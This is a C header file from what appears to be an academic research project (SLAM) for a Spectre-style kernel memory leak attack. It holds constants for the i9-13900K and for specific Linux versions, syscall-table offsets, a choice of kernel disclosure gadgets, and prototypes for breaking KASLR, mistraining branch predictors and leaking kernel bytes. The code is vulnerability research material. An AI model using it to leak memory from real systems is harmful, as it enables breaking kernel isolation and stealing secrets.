/* Interface to SLAM's common functionality.
 *
 * Date: November 23, 2023
 * Author: Mathé Hertogh - Vrije Universiteit Amsterdam
 */

#pragma once

#define _XOPEN_SOURCE 600
#define _GNU_SOURCE
#include <time.h>
#include <sched.h>
#include <stdlib.h>
#include <assert.h>
#include <stdint.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <math.h>
#include <signal.h>
#include <stdarg.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/vfs.h>

// Configurable constants.
#define TIME_INIT_NR_CALIBRATIONS	100
#define CPU				0
#define EVICT_FACTOR_L1D_CACHE		2
#define EVICT_FACTOR_L2_CACHE		2
#define EVICT_FACTOR_L1TLB		2
#define EVICT_FACTOR_L2TLB		4
#define VERBOSITY			1
// #define INTERACTIVE

// Choose which Spectre disclosure gadget in the kernel we want to use.
// #define IDEAL
// #define CGROUP_SEQFILE_SHOW
// #define EXT4_FILE_OPEN
// #define EXT4_FILE_WRITE_ITER
// #define HUGETLBFS_READ_ITER
// #define KERNFS_FOP_READ_ITER
// #define KERNFS_SEQ_SHOW
// #define PROC_SIGNLE_SHOW // TODO fix typo
// #define RAW_SEQ_START
// #define SEL_READ_MLS
// #define SHMEM_FAULT
// #define SHMEM_STATFS

// Which Linux version are we attacking?
#define LINUX_6_3
#ifdef LINUX_6_1_19
#define SYSCALL_TABLE_OFFSET 0x00300 // Lower bits of sys_call_table's address.
#endif
#ifdef LINUX_6_3
#define SYSCALL_TABLE_OFFSET 0x00280 // Lower bits of sys_call_table's address.
#endif
#ifdef LINUX_6_3_FINEIBT
#define SYSCALL_TABLE_OFFSET 0x00320 // Lower bits of sys_call_table's address.
#endif

/* Eviction set sizes in number of entries, ie cachelines for L1D cache, and
 * pages for the TLBs.
 */
#define EVSET_SIZE_L1D_CACHE	(EVICT_FACTOR_L1D_CACHE * L1D_SIZE)	// whole cache
#define EVSET_SIZE_L2_CACHE	(EVICT_FACTOR_L2_CACHE * L2_WAYNESS)	// single set
#define EVSET_SIZE_L1TLB	(EVICT_FACTOR_L1TLB * L1TLB_SIZE)	// whole tlb
#define EVSET_SIZE_L2TLB	38

// Universal constants.
#define KB 1024ULL
#define MB (KB*KB)
#define GB (KB*MB)

// Common machine constants.
#define PAGE_SHIFT		12
#define CACHE_LINE_SHIFT	6

// Machine specific constants for i9-13900K.
#define L1D_WAYNESS		12
#define L1D_NR_SETS		64
#define L2_WAYNESS		16
#define L2_NR_SETS		2048
#define L1TLB_NR_SETS		16
#define L1TLB_WAYNESS		6
#define L2TLB_NR_SETS		128
#define L2TLB_WAYNESS		16
#define XOR_SHIFT		7   // L2 TLB's hash function is XOR-[XOR_SHIFT]
#define PHYS_MEM_SIZE		(64*GB)
#define THRES			23

/* On the i9-13900K, we find some evidence of an Invalid Page Cache (IPC).
 * Namely, after prefetching an invalid page (eg non-present page), consecutive
 * prefetches to the same page execute very fast.
 * If we prefetch a few other invalid pages in between, the prefetch of the
 * initial page becomes slow again. This suggests the MMU caches prefetches to
 * invalid pages. The values below we experimentally determined.
 */
#define IPC_SIZE 4
#define EVICT_FACTOR_IPC 2
#define EVSET_SIZE_IPC (EVICT_FACTOR_IPC * IPC_SIZE)

// Derived constants.
#define PAGE_SIZE	(1UL << PAGE_SHIFT)
#define CACHE_LINE_SIZE	(1UL << CACHE_LINE_SHIFT)
#define HUGE_PAGE_SIZE	(1UL << (PAGE_SHIFT+9))
#define L1D_SIZE	(L1D_NR_SETS * L1D_WAYNESS)	// nr entires, ie cachelines
#define L2_SIZE		(L2_NR_SETS * L2_WAYNESS)	// nr entires, ie cachelines
#define L1TLB_SIZE	(L1TLB_NR_SETS * L1TLB_WAYNESS)	// nr entires, ie pages
#define L2TLB_SIZE	(L2TLB_NR_SETS * L2TLB_WAYNESS)	// nr entires, ie pages

// Shortcuts
#define PROT_RW			(PROT_READ|PROT_WRITE)
#define MAP_ANON_PRIV_POP	(MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE)
#define CLEAR_LINE		"\33[2K\r"

// bhi.c
void bhi_init(uint64_t direct_map);
void bhi_trigger_gadget(char *secret_ptr);

// bhi.S
int fill_bhb_syscall(char *history, uint64_t syscall_nr, uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);
int clear_bhb_call(void *func, uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);

// contention.c
pid_t contention_init();

// evict.c
void evict_init();
void evict_l1d_cache();
void evict_l2_cache_set(int set);
void evict_l1tlb();
void evict_l2tlb_set(int set);
void evict_syscall_table_entry(int syscall_nr);
void evict_ipc(); // Cf. definition of IPC_SIZE.

// gadget.c
void gadget_init(uint64_t direct_map);
const char *gadget_name();
void gadget_trigger(void *secret_ptr);

// kaslr.c
void kaslr_init();
uint64_t find_direct_map();

// leak.c
uint8_t leak_byte(void *secret_ptr, int *confident);
int16_t leak_byte_confident(void *secret_ptr);
uint64_t leak_addr(uint64_t start, uint64_t end, int stride, const char *string);
char *leak_data(char *addr, int len, char *known);

// pht.c
void pht_init();
void pht_save(const char *filename);
void pht_restore(const char *filename);
void pht_randomize();
void pht_mistrain();
char *pht_get_chain();

// reload.c
void reload_init();
char *reload_buf();
void reload_move_buf(void *new_addr);
void reload_replace_buf(const char *data, int misalignment);
uint64_t reload(int reload_idx);

// set.c
int l1d_set(void *addr);
int l2_set_hugepage(void *addr);
int l1tlb_set(void *addr);
int l2tlb_set(void *addr);

// signal.c
void signal_reset(int reload_idx);
uint64_t signal_raw_read(int reload_idx);
uint64_t signal_get(void *secret_ptr, int reload_idx);
int signal_hit(void *secret_ptr, int reload_idx);

// time.c
void timer_init();
uint64_t time_access(volatile char *addr);
uint64_t time_prefetch(volatile char *addr);
void step_start();
void step_end();
uint64_t clock_read();

// util.c
void config();
void fail(const char *msg);
void init_rand();
void sort(uint64_t A[], unsigned size);
uint64_t median_sort(uint64_t A[], unsigned size);
uint64_t minimum_sort(uint64_t A[], unsigned size);
int max_idx(uint64_t A[], int size);
uint64_t avg(uint64_t A[], unsigned size);
uint64_t lrand(void);
char rand_printable_ascii_char();
void mmap_random_pages(void **ptrs, int nr);
int mmap_at(void *addr);
void *alloc_contiguous_pages(void *addr, int split);
uint64_t direct_map_alias(uint64_t virtual_address, uint64_t direct_map);
void print_progress_bar(const char *prefix, int percentage);
uint64_t next_page(uint64_t addr);
const char *cpu_name();
const char *kernel_name();
void set_cpu_affinity(int cpu_id);
int get_sibling(int cpu_id);
float std_dev(uint64_t A[], unsigned size);
float avgf(float A[], unsigned size);
void list_print(uint64_t *A, unsigned size);
void append(volatile char *A[], char *x);
void visualize_medians(uint64_t medians[256]);

// Printing helpers.
#if VERBOSITY >= 0
void pr_result(const char *format, ...);
#else
static inline void pr_result(const char *format, ...) { }
#endif
#if VERBOSITY >= 1
void pr_info(const char *format, ...);
#else
static inline void pr_info(const char *format, ...) { }
#endif
#if VERBOSITY >= 2 || (VERBOSITY == 1 && defined INTERACTIVE)
void pr_interactive(const char *format, ...);
#else
static inline void pr_interactive(const char *format, ...) { }
#endif
#if VERBOSITY >= 2
void pr_verbose(const char *format, ...);
#else
static inline void pr_verbose(const char *format, ...) { }
#endif
#if VERBOSITY >= 3
void pr_debug(const char *format, ...);
#else
static inline void pr_debug(const char *format, ...) { }
#endif
void pr_err(const char *format, ...);

// Oneliners.
__always_inline static inline uint64_t minimum(uint64_t a, uint64_t b) { return a < b ? a : b; }
__always_inline static inline uint64_t maximum(uint64_t a, uint64_t b) { return a > b ? a : b; }
__always_inline static inline void swap(void **a, void **b) { void *c = *a; *a = *b; *b = c; }
__always_inline static inline void clflush(volatile char *addr) { asm volatile ("clflush (%0)\n\t" :: "r"(addr):); }
__always_inline static inline void cpuid(void) { asm volatile ("xor %%rax, %%rax\ncpuid\n\t" ::: "%rax", "%rbx", "%rcx", "%rdx"); }
__always_inline static inline void mfence(void) { asm volatile ("mfence\n\t":::); }
__always_inline static inline void lfence(void) { asm volatile ("lfence\n\t":::); }
__always_inline static inline void sfence(void) { asm volatile ("sfence\n\t":::); }
__always_inline static inline void prefetcht0(volatile char *addr) { asm volatile ("prefetcht0 (%0)\n\t" :: "r" (addr):); }
__always_inline static inline void load(void *addr) { *(volatile char *)addr; }
